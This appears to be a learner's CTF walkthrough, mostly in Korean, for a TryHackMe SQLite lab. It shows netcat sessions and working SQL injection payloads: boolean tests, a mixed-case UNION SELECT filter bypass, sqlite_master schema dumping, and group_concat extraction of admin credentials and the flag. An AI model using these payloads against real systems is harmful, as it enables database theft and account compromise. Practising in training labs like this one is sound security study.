nc 10.10.169.254 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: vYQ5ngPpw8AdUmL
Username not found.

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 61:c5:06:f2:4a:20:5b:cd:09:4d:72:b0:a5:aa:ce:71 (RSA)
| 256 51:e0:5f:fa:81:64:d3:d9:26:24:16:ca:45:94:c2:00 (ECDSA)
|\_ 256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)
Device type: general purpose

```bash
apt install seclists
apt install wordlists
```

nc 10.10.169.254 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 1' OR '1' = '1
Password: tF8tj2o94WE4LKC
Please enter your username: 1' OR '1' = '1'

# 결과가 참일 시에만 제대로 반응

Please enter your username: 1' OR '1' = '2'  
Error: unrecognized token: "'2'' LIMIT 30"

```bash
# sqlite DB 추측
Error: unrecognized token: "'1'' LIMIT 30"
```

Please enter your username: --
For strange reasons I can't explain, any input containing /\*, -- or, %0b is not allowed :)

' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
Please enter your username:

```bash
apt install rlwarp
rlwrap nc 10.10.169.254 1337
```

# SQLite 확인

rlwrap nc 10.10.169.254 1337
Welcome to the Light database!

# input 필터링 하는 것으로 보이나 대소문자를 섞으니 뚫리는 것 확인

Ahh there is a word in there I don't like :(
Please enter your username: ' Union SElect 1 '
Password: 1
Please enter your username: ' union select 1 '
Ahh there is a word in there I don't like :(
Please enter your username:

# 왜 rlwrap nc 10.10.169.254 1337 하면 데이터베이스 같은 정보가 나올까?

rlwrap가 nc에 뭘 더해주거나 바꾸는 게 아니라, 단순히 입력받는 인터페이스에 readline 기능을 씌워줄 뿐입니다.
데이터베이스 정보가 나오는 이유는:
10.10.169.254의 1337 포트에서 Light database라는 서버가 돌고 있어서,
접속하자마자 서버가 "Welcome to the Light database!" 메시지를 보내준 거예요.
즉, nc가 그냥 TCP 연결을 열고 서버와 통신하는 역할을 하니까,
rlwrap를 썼든 안 썼든 서버가 보내는 데이터(문자열)는 똑같이 나오는 거죠.

# sqlite 특징

SELECT group_concat(sql) FROM sqlite_master;

| 컬럼명     | 설명                                              |
| ---------- | ------------------------------------------------- |
| `type`     | 객체의 유형 (`table`, `index`, `view`, `trigger`) |
| `name`     | 객체 이름                                         |
| `tbl_name` | 이 객체가 속한 테이블 이름                        |
| `rootpage` | B-트리 페이지 번호 (보통 사용 안 함)              |
| `sql`      | **해당 객체를 생성한 CREATE 구문**                |

' Union Select group_concat(sql) FROM sqlite_master '

Please enter your username' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
id INTEGER PRIMARY KEY,
username TEXT,
password INTEGER),
CREATE TABLE admintable (
id INTEGER PRIMARY KEY,
username TEXT,
password INTEGER)

# 유니온 시 컬럼 수가 양쪽 컬럼과 안 맞다고함

' Union SElect \* FROM admintable '
Error: SELECTs to the left and right of UNION do not have the same number of result columns
Please enter your username: ' Union Select id FROM admintable '
Password: 1
Please enter your username: ' Union Select id, username FROM admintable '
Error: SELECTs to the left and right of UNION do not have the same number of result columns

# jsut select 1 column

Please enter your username: ' Union Select username FROM admintable '
Password: TryHackMeAdmin
Please enter your username: ' Union Select password FROM admintable '
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
Please enter your username:

```sql
# 아래 구조로 추정됨
SELECT username FROM sometable WHERE username = '<사용자 입력값>'
UNION
SELECT <컬럼> FROM <테이블> -- (인젝션)
```

# 따옴표 처리 문제 -> 시스템 내에서 '' table 등 처리하고 있어서 어려움

' Union Select password FROM usertable where username=\"smokey\" '
Error: unrecognized token: "\"
Please enter your username: ' Union Select password FROM usertable where username='smokey' '
Error: near "''": syntax error
Please enter your username:

# best

' Union Select group_concat(username || ":" || password || ":" || id) FROM admintable '

Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17:1,flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}:2
